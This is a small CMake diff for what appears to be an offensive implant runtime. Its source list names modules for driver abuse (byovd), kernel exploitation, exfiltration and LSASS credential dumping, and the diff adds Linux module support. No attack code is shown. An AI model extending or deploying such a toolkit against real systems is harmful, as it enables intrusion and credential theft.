@@ -14,6 +14,7 @@ set(RUNTIME_SOURCES
     execution/inmem.c
     execution/byovd.c
     execution/driver_interact.c
+    execution/linux_modules.c
     exploitation/kernel_exploit.c
     exfil/exfil.c
     exfil/lsass_dump.c
@@ -48,6 +49,9 @@ target_include_directories(jocky_rt PUBLIC include)
 
 if(WIN32)
     target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi wevtapi)
+else()
+    # Linux: link against libdl for dlopen/dlsym
+    target_link_libraries(jocky_rt PUBLIC dl)
 endif()
 
 # Example: build a test executable
